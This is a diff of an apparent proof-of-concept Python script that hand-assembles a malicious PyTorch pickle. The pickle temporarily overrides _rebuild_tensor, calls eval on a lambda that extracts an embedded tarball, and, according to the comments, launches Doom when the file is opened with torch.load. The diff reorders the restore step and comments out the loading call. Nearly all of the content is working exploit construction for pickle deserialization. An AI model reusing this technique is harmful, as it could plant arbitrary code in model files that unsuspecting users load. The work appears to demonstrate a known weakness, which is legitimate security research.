@@ -80,7 +80,6 @@ def get_value(name: p.Opcode = p.Unicode(b"_rebuild_tensor")) -> list[p.Opcode]:
         p.StackGlobal(),
     ]
 
-
 # tl;dr
 # get an innocous module
 # use BUILD to set variables in the module with innocous names
@@ -111,6 +110,8 @@ exploit = [
     # to know what was imported here
     p.StackGlobal(),
     vars.add(p.Memoize(), "eval"),
+    # _utils._rebuild_tensor = orig_rebuild_tensor
+    *set_value(vars["orig_rebuild_tensor"]),
     # lambda to untarball so that we can reduce
     p.Unicode(
         b"lambda data: __import__('tarfile').open(fileobj=__import__('io').BytesIO(data)).extractall()"
@@ -129,8 +130,6 @@ exploit = [
     p.TupleOne(),
     p.Reduce(),
     p.Pop(),
-    # _utils._rebuild_tensor = orig_rebuild_tensor
-    *set_value(vars["orig_rebuild_tensor"]),
 ]
 
 
@@ -200,6 +199,6 @@ f.close()
 print("loading cool vae")
 # note! this launches doom! and waits for it to exit!
 # doom is poorly behaved and doesn't clean up the screen
-cool_model = torch.load(output_path)
+#cool_model = torch.load(output_path)
 # print(cool_model)
 pt.dis(dumped, out=open("vae_dis", "w"))
